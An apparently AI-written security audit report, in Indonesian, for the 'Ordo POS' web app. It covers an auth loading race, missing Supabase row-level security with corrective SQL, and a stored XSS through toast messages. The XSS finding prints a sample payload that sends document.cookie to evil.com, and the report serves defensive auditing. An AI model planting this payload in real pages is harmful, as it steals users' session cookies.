# Ordo POS — Laporan Audit Keamanan

> **Tanggal Audit**: 29 September 2026  
> **Auditor**: Antigravity (Senior Security Engineer Mode)  
> **Codebase**: `d:\ORDO\Ordo v0\Ordo v0`

---

## Ringkasan Eksekutif

| # | Sektor | Status | Tingkat Risiko |
|---|--------|--------|----------------|
| 1 | Proteksi Router (Frontend Auth) | ⚠️ Ada Celah | **MEDIUM** |
| 2 | Keamanan Database (Supabase RLS) | 🔴 Ada Celah | **KRITIS** |
| 3 | Kebocoran Kredensial (Env Vars) | ✅ Aman | Rendah |
| 4 | XSS & Input Sanitization | 🔴 Ada Celah | **TINGGI** |

---

## Sektor 1: Proteksi Router (Frontend Auth)

### Temuan: ⚠️ CELAH MEDIUM — Race Condition Saat Loading

**File**: [`src/App.tsx` baris 1413–1414](file:///d:/ORDO/Ordo%20v0/Ordo%20v0/src/App.tsx#L1413-L1414)

```tsx
// KODE SAAT INI — BERMASALAH
if (currentView === 'landing' || !currentUser) {
  return ( <LandingPage ... /> );
}
```

**Masalah**: Kondisi guard `!currentUser` sudah benar, **tetapi** saat aplikasi pertama kali dimuat:
- `isAuthLoading = true` (Supabase sedang verifikasi sesi)
- `currentUser = null` (belum terisi)
- **Akibat**: Selama ~200-500ms, layar menampilkan LandingPage + modal Login, bukan loading spinner. Ini menyebabkan **flash of unauthenticated content** — user yang sudah login melihat halaman landing sebentar sebelum redirect ke dashboard.

**Status yang lebih berbahaya**: Jika seseorang memanipulasi URL langsung ke `/dashboard` sebelum loading selesai, mereka sejenak bisa melihat struktur layout dashboard (Sidebar, Header) meskipun tanpa data — karena ada kode di `getInitialView()` yang membaca path URL dan langsung set `currentView = 'dashboard'` tanpa memeriksa status login.

**Perbaikan**: Tambahkan loading screen saat `isAuthLoading === true` sebelum cek `!currentUser`.

---

## Sektor 2: Keamanan Database (Supabase RLS)

### Temuan: 🔴 CELAH KRITIS — RLS Kemungkinan Besar Belum Aktif

**File terkait**: semua file di `src/services/`

Semua query ke Supabase (misalnya `fetchServiceTickets`, `fetchCustomers`, `upsertCustomer`) menggunakan **Anon Key** dan **tidak ada validasi RLS di level query**. Ini berarti:

- Jika RLS belum diaktifkan di Supabase Dashboard, **siapapun yang mengetahui URL Supabase dan Anon Key bisa membaca/menulis data semua toko**.
- Anon Key sudah terekspos di bundle JavaScript (ini normal untuk `anon key`), tapi tanpa RLS, ia menjadi kunci master.

**Query SQL RLS yang harus Anda jalankan** → lihat Sektor 2 di bawah.

---

## Sektor 3: Kebocoran Kredensial

### Temuan: ✅ AMAN

- `.env` hanya berisi `VITE_SUPABASE_URL` dan `VITE_SUPABASE_ANON_KEY` — **tidak ada `service_role` key**.
- `.gitignore` sudah mengecualikan `.env*` (kecuali `.env.example`).
- `supabase.ts` hanya menggunakan `VITE_SUPABASE_ANON_KEY`.
- Tidak ada hardcoded secret di kode.

> **Catatan**: `VITE_SUPABASE_ANON_KEY` memang **sengaja** bersifat publik di frontend — ini adalah desain Supabase yang benar. Kuncinya adalah memastikan RLS di database sudah aktif (Sektor 2).

---

## Sektor 4: XSS & Input Sanitization

### Temuan: 🔴 CELAH TINGGI — `dangerouslySetInnerHTML` dengan Data User

**File**: [`src/components/ToastContainer.tsx` baris 38](file:///d:/ORDO/Ordo%20v0/Ordo%20v0/src/components/ToastContainer.tsx#L38)

```tsx
// KODE BERMASALAH
dangerouslySetInnerHTML={{ __html: toast.message }}
```

**File**: [`src/App.tsx` baris 634–636](file:///d:/ORDO/Ordo%20v0/Ordo%20v0/src/App.tsx#L634-L636)

```tsx
// DATA USER LANGSUNG DIINJEKSI KE HTML — BERMASALAH
const toastMsg = `Tiket <b>${newTicket.ticketNo}</b> dibuat untuk pelanggan terdaftar <b>${formData.customerName}</b>.`
```

**Skenario Serangan**:
Jika seseorang mendaftarkan pelanggan dengan nama:
```
<img src=x onerror="fetch('https://evil.com/?cookie='+document.cookie)">
```
Nama tersebut akan dirender sebagai HTML murni di Toast, mengeksekusi JavaScript berbahaya (XSS Stored).

**Perbaikan**: Ganti `dangerouslySetInnerHTML` dengan parsing HTML yang aman (hanya izinkan tag `<b>` tertentu dan sanitasi input user).

---

## SQL RLS — Jalankan di Supabase SQL Editor

> [!IMPORTANT]
> Copy seluruh blok SQL di bawah ini dan jalankan di **Supabase Dashboard → SQL Editor → New Query**.

```sql
-- ============================================================
-- ORDO POS — ROW LEVEL SECURITY (RLS) POLICIES
-- Jalankan SEKALI di Supabase SQL Editor
-- ============================================================

-- ─── 1. AKTIFKAN RLS PADA SEMUA TABEL KRITIS ─────────────────
ALTER TABLE public.services ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.customers ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.stores ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.cash_entries ENABLE ROW LEVEL SECURITY;

-- ─── 2. HAPUS POLICY LAMA (JIKA ADA) ─────────────────────────
DROP POLICY IF EXISTS "Owner can manage own services" ON public.services;
DROP POLICY IF EXISTS "Owner can manage own customers" ON public.customers;
DROP POLICY IF EXISTS "Owner can manage own store" ON public.stores;
DROP POLICY IF EXISTS "Owner can read own profile" ON public.profiles;
DROP POLICY IF EXISTS "Owner can update own profile" ON public.profiles;
DROP POLICY IF EXISTS "Owner can manage own cash entries" ON public.cash_entries;

-- ─── 3. TABEL: services ───────────────────────────────────────
-- User hanya bisa SELECT/INSERT/UPDATE/DELETE tiket milik toko mereka sendiri
CREATE POLICY "Owner can manage own services"
  ON public.services
  FOR ALL
  USING (
    store_id IN (
      SELECT id FROM public.stores WHERE owner_id = auth.uid()
    )
  )
  WITH CHECK (
    store_id IN (
      SELECT id FROM public.stores WHERE owner_id = auth.uid()
    )
  );

-- ─── 4. TABEL: customers ──────────────────────────────────────
CREATE POLICY "Owner can manage own customers"
  ON public.customers
  FOR ALL
  USING (
    store_id IN (
      SELECT id FROM public.stores WHERE owner_id = auth.uid()
    )
  )
  WITH CHECK (
    store_id IN (
      SELECT id FROM public.stores WHERE owner_id = auth.uid()
    )
  );

-- ─── 5. TABEL: stores ─────────────────────────────────────────
CREATE POLICY "Owner can manage own store"
  ON public.stores
  FOR ALL
  USING (owner_id = auth.uid())
  WITH CHECK (owner_id = auth.uid());

-- ─── 6. TABEL: profiles ───────────────────────────────────────
CREATE POLICY "Owner can read own profile"
  ON public.profiles
  FOR SELECT
  USING (id = auth.uid());

CREATE POLICY "Owner can update own profile"
  ON public.profiles
  FOR UPDATE
  USING (id = auth.uid())
  WITH CHECK (id = auth.uid());

-- ─── 7. TABEL: cash_entries ───────────────────────────────────
CREATE POLICY "Owner can manage own cash entries"
  ON public.cash_entries
  FOR ALL
  USING (
    store_id IN (
      SELECT id FROM public.stores WHERE owner_id = auth.uid()
    )
  )
  WITH CHECK (
    store_id IN (
      SELECT id FROM public.stores WHERE owner_id = auth.uid()
    )
  );

-- ─── 8. BLOKIR AKSES ANON TOTAL ──────────────────────────────
-- Pastikan tidak ada policy yang membolehkan akses tanpa autentikasi
REVOKE ALL ON public.services FROM anon;
REVOKE ALL ON public.customers FROM anon;
REVOKE ALL ON public.cash_entries FROM anon;
REVOKE ALL ON public.stores FROM anon;
REVOKE ALL ON public.profiles FROM anon;

-- ─── 9. VERIFIKASI (Jalankan setelah apply) ──────────────────
-- Query ini memastikan RLS aktif di semua tabel
SELECT tablename, rowsecurity
FROM pg_tables
WHERE schemaname = 'public'
  AND tablename IN ('services', 'customers', 'stores', 'profiles', 'cash_entries');
-- Kolom "rowsecurity" harus bernilai TRUE untuk semua tabel di atas
```

---

## Perbaikan Kode yang Diimplementasikan

### Fix 1: Auth Loading Gate (App.tsx)
- Tambahkan `if (isAuthLoading) return <LoadingScreen />`
- Cegah flash of unauthenticated content

### Fix 2: XSS Sanitization (ToastContainer.tsx + App.tsx)
- Hapus `dangerouslySetInnerHTML`
- Ganti dengan parser HTML sederhana yang hanya mengizinkan tag `<b>` saja
- Sanitasi `formData.customerName` sebelum dimasukkan ke toast HTML

---

> [!WARNING]
> **PRIORITAS TERTINGGI**: Jalankan SQL RLS di atas **sekarang** sebelum deploy. Tanpa RLS, siapapun yang mengetahui URL project Supabase Anda dapat mengakses data semua toko via API call langsung.
